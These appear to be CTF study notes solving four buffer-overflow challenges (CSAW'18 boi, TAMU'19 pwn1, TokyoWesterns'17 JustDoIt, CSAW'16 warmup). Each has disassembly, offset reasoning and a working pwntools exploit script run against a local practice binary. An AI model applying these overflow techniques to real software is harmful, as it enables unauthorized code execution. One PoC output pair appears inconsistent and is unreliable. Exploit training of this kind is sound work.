# CSAW'18: Quals Boi

#gdb #pwntools csaw18_qualsboi
```c
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:    mov    edi,0x400764         ; "Are you a big boiiiii??"
   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]       ; read 18 bytes to rbp-30
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]  ; rbp - 1c is 14 bytes from rbp-30
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee       
   0x00000000004006ad <+108>:   jne    0x4006bb <main+122>
   0x00000000004006af <+110>:   mov    edi,0x40077c          ; "/bin/bash"
   0x00000000004006b4 <+115>:   call   0x400626 <run_cmd>

- send 0x14 junk the 0xcaf3baee (in LE)

------------------------ PoC
└─$ perl -e 'print "A"x0x14 . "\xee\xba\xf3\xcb"' | ./boi
Are you a big boiiiii??
Sat May 13 07:43:25 PM EDT 2023
                                                                          
└─$ perl -e 'print "A"x0x14 . "\xee\xba\xf3\xca"' | ./boi
Are you a big boiiiii??
(no date)

------------------------ script
#!/usr/bin/python3
from pwn import *

buffsize = 0x14
target = p32(0xcaf3baee)

payload = b"A"*buffsize + target

r = process("./boi")
r.recvuntil(b'??\x0a')
r.send(payload)
r.interactive()

------------------------ pwn
└─$ ./exploit.py 
[+] Starting local process './boi': pid 494103
[*] Switching to interactive mode
$ whoami
soooop
```

# TAMU'19: Pwn1

```c
└─$ file pwn1 
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped

└─$ pwn checksec pwn1
[*] '/home/soooop/train/nightmare/modules/04-bof_variable/tamu19_pwn1/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
└─$ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
sooops
I don't know that! Auuuuuuuugh!
```

#ghidra  tamu19_pwn1
```c
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }

--------------------------------- ok so
Sir Lancelot of Camelot
To seek the Holy Grail.
43 -> 18 is 0x2b bytes
-0x215eef38 is 0xdea110c8

--------------------------------- script
#!/usr/bin/python3
from pwn import *

offset = 0x2b
target = p32(0xdea110c8)
payload = b"A"*offset + target

r = process('./pwn1')
r.recvuntil(b'name?\n')
r.sendline(b'Sir Lancelot of Camelot')
r.recvuntil(b'quest?\n')
r.sendline(b'To seek the Holy Grail.')
r.recvuntil(b'secret?\n')
r.sendline(payload)
print(r.recv(1000))

--------------------------------- pwn
└─$ ./exploit.py 
[+] Starting local process './pwn1': pid 498659
b'Right. Off you go.\nflag{g0ttem_b0yz}\n\n'
[*] Process './pwn1' stopped with exit code 0 (pid 498659)
```

# TokyoWesterns'17: JustDoIt

```c
└─$ file just_do_it 
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
                                         
└─$ pwn checksec just_do_it 
[*] '/home/soooop/train/nightmare/modules/04-bof_variable/tw17_justdoit/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
                                 
└─$ ./just_do_it 
Welcome my secret service. Do you know the password?
Input the password.
password
Invalid Password, Try Again!
```

#ghidra tw17_justdoit
```c
local_14 = "Invalid Password, Try Again!";
pcVar1 = fgets(flag,0x30,local_18);

  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);

  iVar2 = strcmp(local_28,"P@SSW0RD");
  if (iVar2 == 0) {
    local_14 = "Correct Password, Welcome!";
  }
  puts(local_14);
  return 0;

---------------------------- P@SSW0RD
- but as you can see, it doesn't do anything
- fgets 0x20 to local_28 let's us overwrite:
	- local_18 (flag.txt fd)
	- local_14 (ptr to string to puts)
	- local_c (unused)
- ptr to string to puts.  Flag is at global data.  Only partial relro

                             flag                                            XREF[2]:     Entry Point(*), main:08048650(*)  
        0804a080 00 00 00        undefine
                 00 00 00 
                 00 00 00 

flag: 0x0804a080

- write 0x14 buffer, write addr of flag

---------------------------- script
#!/usr/bin/python3
from pwn import *

r = process('./just_do_it')

buffer = 0x14
target = p32(0x0804a080)
payload = b"A"*buffer + target

r.recvuntil(b'password.\n')
r.sendline(payload)
print(r.recv(100).decode())

---------------------------- pwn
└─$ ./exploit.py 
[+] Starting local process './just_do_it': pid 509944
TWCTF{pwnable_warmup_I_did_it!}
```

# CSAW'16: Warmup

```c
└─$ file warmup    
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
                                                                              
└─$ pwn checksec warmup    
[*] '/home/soooop/train/nightmare/modules/05-bof_callfunction/csaw16_warmup/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
                                                                              
└─$ ./warmup 
-Warm Up-
WOW:0x40060d
>waht?
```
- prob addr of win()

#gdb csaw16_warmup
```c
gef➤  i functions 
All defined functions:

Non-debugging symbols:
0x0000000000400488  _init
0x00000000004004c0  write@plt
0x00000000004004d0  system@plt
0x00000000004004e0  __libc_start_main@plt
0x00000000004004f0  __gmon_start__@plt
0x0000000000400500  gets@plt
0x0000000000400510  sprintf@plt
0x0000000000400520  _start
0x0000000000400550  deregister_tm_clones
0x0000000000400580  register_tm_clones
0x00000000004005c0  __do_global_dtors_aux
0x00000000004005e0  frame_dummy
0x000000000040060d  easy
0x000000000040061d  main
0x00000000004006b0  __libc_csu_init
0x0000000000400720  __libc_csu_fini
0x0000000000400724  _fini

---= yep
-------------------------- easy
gef➤  disass easy
Dump of assembler code for function easy:
   0x000000000040060d <+0>:     push   rbp
   0x000000000040060e <+1>:     mov    rbp,rsp
   0x0000000000400611 <+4>:     mov    edi,0x400734
   0x0000000000400616 <+9>:     call   0x4004d0 <system@plt>
   0x000000000040061b <+14>:    pop    rbp
   0x000000000040061c <+15>:    ret
End of assembler dump.
gef➤  x/s 0x400734
0x400734:       "cat flag.txt"

-------------------------- main
   0x0000000000400692 <+117>:   lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:   mov    rdi,rax
   0x0000000000400699 <+124>:   mov    eax,0x0
   0x000000000040069e <+129>:   call   0x400500 <gets@plt>

---= rbp-40 + 48 buffsize + retaddr

-------------------------- script
└─$ cat exploit.py 
#!/usr/bin/python3
from pwn import *

r = process('./warmup')

offset = 0x48
# target tbd

r.recvuntil(b'WOW:')

target = r.recvuntil(b'\n')
target = p64(int(target.decode().strip(), 16))
payload = b"A"*offset + target

r.recvuntil(b'>')
r.send(payload)

print(r.recv(100).decode())

-------------------------- segfault
it's segfaulting in the syscall... stack alignment
 → 0x7ffff7e19013 <do_system+339>  movaps XMMWORD PTR [rsp+0x50], xmm0

just add another ret
   0x00000000004006a4 <+135>:   ret

-------------------------- final script
#!/usr/bin/python3
from pwn import *

r = process('./warmup')

offset = 0x48
ret1 = p64(0x00000000004006a4)
# target tbd

r.recvuntil(b'WOW:')

target = r.recvuntil(b'\n')
target = p64(int(target.decode().strip(), 16))

# notice double ret, for stack alignment
payload = b"A"*offset + ret1 + target

r.recv(100)
r.sendline(payload)

print(r.recv(100).decode())

-------------------------- pwn
└─$ ./exploit.py  
[+] Starting local process './warmup': pid 521593
flag{g0ttem_b0yz}
```









































